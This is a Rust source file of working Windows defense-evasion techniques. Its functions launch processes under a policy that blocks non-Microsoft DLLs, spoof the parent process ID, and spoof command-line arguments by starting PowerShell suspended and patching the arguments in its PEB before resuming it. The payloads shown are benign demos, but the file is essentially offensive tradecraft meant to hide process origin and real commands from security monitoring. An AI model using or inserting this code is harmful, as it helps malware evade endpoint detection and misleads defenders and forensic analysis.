use std::{mem::size_of, os::raw::c_void};
use windows::{
    core::{PCSTR, PSTR, PWSTR},
    Wdk::System::Threading::{NtQueryInformationProcess, PROCESSINFOCLASS},
    Win32::{
        Foundation::{self, CloseHandle, HANDLE},
        System::{
            Diagnostics::Debug::{ReadProcessMemory, WriteProcessMemory},
            Threading::{
                CreateProcessA, DeleteProcThreadAttributeList, InitializeProcThreadAttributeList,
                OpenProcess, ResumeThread, UpdateProcThreadAttribute, EXTENDED_STARTUPINFO_PRESENT,
                LPPROC_THREAD_ATTRIBUTE_LIST, PEB, PROCESS_BASIC_INFORMATION,
                PROCESS_CREATE_PROCESS, PROCESS_CREATION_FLAGS, PROCESS_INFORMATION,
                PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
                RTL_USER_PROCESS_PARAMETERS, STARTUPINFOA, STARTUPINFOEXA,
            },
        },
    },
};

pub fn apply_process_mitigation_policy() {
    let mut startup_info = STARTUPINFOEXA::default();
    startup_info.StartupInfo.cb = size_of::<STARTUPINFOEXA>() as u32;

    // Get size for the LPPROC_THREAD_ATTRIBUTE_LIST
    // We only use 1 argument (the mitigation policy)
    let mut lpsize = 0;
    unsafe {
        let _ = InitializeProcThreadAttributeList(
            LPPROC_THREAD_ATTRIBUTE_LIST::default(),
            1,
            0,
            &mut lpsize,
        );
    };

    // Create the memory needed for the attribute list
    let mut attribute_list: Box<[u8]> = vec![0; lpsize].into_boxed_slice();
    startup_info.lpAttributeList = LPPROC_THREAD_ATTRIBUTE_LIST(attribute_list.as_mut_ptr() as _);
    // Calling InitializeProcThreadAttributeList again to initialize the list
    unsafe {
        let _ = InitializeProcThreadAttributeList(startup_info.lpAttributeList, 1, 0, &mut lpsize);
    };

    // Update the list so that it contains the PPID
    let policy: u64 = 0x100000000000; //  PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON
    unsafe {
        let _ = UpdateProcThreadAttribute(
            startup_info.lpAttributeList,
            0,
            PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY as usize,
            Some(&policy as *const _ as *const c_void),
            size_of::<u64>(),
            None,
            None,
        )
        .expect("Could not update ProcThreadAttribute");
    }

    // The updated list can then be used within CreateProcess with the EXTENDED_STARTUPINFO_PRESENT flag
    let mut process_info = PROCESS_INFORMATION::default();
    let _ = unsafe {
        CreateProcessA(
            PCSTR("C:\\Windows\\System32\\notepad.exe\0".as_ptr()),
            PSTR(String::from("\"C:\\Windows\\System32\\notepad.exe\"\0").as_mut_ptr()),
            None,
            None,
            false,
            EXTENDED_STARTUPINFO_PRESENT,
            None,
            None,
            &startup_info.StartupInfo,
            &mut process_info,
        )
        .expect("Could not create process")
    };

    // Clean up
    unsafe {
        DeleteProcThreadAttributeList(startup_info.lpAttributeList);
    };
}

pub fn spoof_ppid(ppid: u32) {
    let mut startup_info = STARTUPINFOEXA::default();
    startup_info.StartupInfo.cb = size_of::<STARTUPINFOEXA>() as u32;

    // Get size for the LPPROC_THREAD_ATTRIBUTE_LIST
    // We only use 1 argument (the parent id process)
    let mut lpsize = 0;
    unsafe {
        let _ = InitializeProcThreadAttributeList(
            LPPROC_THREAD_ATTRIBUTE_LIST::default(),
            1,
            0,
            &mut lpsize,
        );
    };

    // Create the memory needed for the attribute list
    let mut attribute_list: Box<[u8]> = vec![0; lpsize].into_boxed_slice();
    startup_info.lpAttributeList = LPPROC_THREAD_ATTRIBUTE_LIST(attribute_list.as_mut_ptr() as _);
    // Calling InitializeProcThreadAttributeList again to initialize the list
    unsafe {
        let _ = InitializeProcThreadAttributeList(startup_info.lpAttributeList, 1, 0, &mut lpsize);
    };

    //Open handle to PPID
    let handle_parent = unsafe {
        OpenProcess(PROCESS_CREATE_PROCESS, false, ppid)
            .expect("Could not open handle to parent process.")
    };

    // Update the list so that it contains the PPID
    unsafe {
        let _ = UpdateProcThreadAttribute(
            startup_info.lpAttributeList,
            0,
            PROC_THREAD_ATTRIBUTE_PARENT_PROCESS as usize,
            Some(&handle_parent as *const _ as *const c_void),
            size_of::<HANDLE>(),
            None,
            None,
        );
    }

    // The updated list can then be used within CreateProcess with the EXTENDED_STARTUPINFO_PRESENT flag
    let mut process_info = PROCESS_INFORMATION::default();
    let _ = unsafe {
        CreateProcessA(
            PCSTR("C:\\Windows\\System32\\notepad.exe\0".as_ptr()),
            PSTR(String::from("\"C:\\Windows\\System32\\notepad.exe\"\0").as_mut_ptr()),
            None,
            None,
            false,
            EXTENDED_STARTUPINFO_PRESENT,
            None,
            None,
            &startup_info.StartupInfo,
            &mut process_info,
        )
        .expect("Could not create process")
    };

    // Clean up
    unsafe {
        DeleteProcThreadAttributeList(startup_info.lpAttributeList);
        let _ = CloseHandle(handle_parent);
    };
}

pub fn spoof_arguments() {
    let mut startup_info = STARTUPINFOA::default();
    startup_info.cb = size_of::<STARTUPINFOA>() as u32;
    let mut process_info = PROCESS_INFORMATION::default();

    unsafe {
        // Keep in mind that the fake arguments need to be longer then the real arguments.
        let _ = CreateProcessA(
            PCSTR("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\0".as_ptr()),
            PSTR(String::from("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -c \"(Get-PSDrive $Env:SystemDrive.Trim(':')).Free/1GB\"\0").as_mut_ptr()),
            None,
            None,
            false,
            PROCESS_CREATION_FLAGS(0x00000004), //CREATE_SUSPENDED
            None,
            None,
            &startup_info,
            &mut process_info
        ).expect("Could not create process");

        let mut pbi = PROCESS_BASIC_INFORMATION::default();

        let mut return_length = 0;
        NtQueryInformationProcess(
            process_info.hProcess,
            PROCESSINFOCLASS(0),
            &mut pbi as *mut _ as *mut c_void,
            size_of::<PROCESS_BASIC_INFORMATION>() as u32,
            &mut return_length,
        );

        // Read PEB from new process
        let mut peb = PEB::default();
        ReadProcessMemory(
            process_info.hProcess,
            pbi.PebBaseAddress as *const c_void,
            &mut peb as *mut _ as *mut c_void,
            size_of::<PEB>(),
            None,
        )
        .expect("Could not read PEB");

        // Read arguments from new process
        let mut parameters = RTL_USER_PROCESS_PARAMETERS::default();
        ReadProcessMemory(
            process_info.hProcess,
            peb.ProcessParameters as *const c_void,
            &mut parameters as *mut _ as *mut c_void,
            size_of::<RTL_USER_PROCESS_PARAMETERS>(),
            None,
        )
        .expect("Could not read arguments");

        let mut encoded_args: Vec<u16> = "powershell -c \"Write-Host Hello World\"\0"
            .encode_utf16()
            .collect();

        // Patching the length. This step is optional.
        // If this step is skipped the arguments string will be printed in full length when examined through ProcessHacker
        let length = size_of::<u16>() * encoded_args.len();
        let offset = size_of::<[u8; 16]>()
            + size_of::<[*mut c_void; 10]>()
            + size_of::<Foundation::UNICODE_STRING>();
        WriteProcessMemory(
            process_info.hProcess,
            (peb.ProcessParameters as *const c_void).add(offset),
            &length as *const usize as *const c_void,
            size_of::<u16>(),
            None,
        )
        .expect("Could not write length");

        // Clear out the old arguments.
        WriteProcessMemory(
            process_info.hProcess,
            parameters.CommandLine.Buffer.as_ptr() as *const c_void,
            vec![0; (parameters.CommandLine.Length) as usize].as_ptr() as *const c_void,
            parameters.CommandLine.Length as usize,
            None,
        )
        .expect("Could not clean arguments");

        // Patching the new arguments.
        let real_args = PWSTR(encoded_args.as_mut_ptr());
        WriteProcessMemory(
            process_info.hProcess,
            parameters.CommandLine.Buffer.as_ptr() as *const c_void,
            real_args.as_ptr() as *const c_void,
            size_of::<u16>() * encoded_args.len(),
            None,
        )
        .expect("Could not write arguments");

        ResumeThread(process_info.hThread);

        // Cleanup
        let _ = CloseHandle(process_info.hThread);
        let _ = CloseHandle(process_info.hProcess);
    };
}
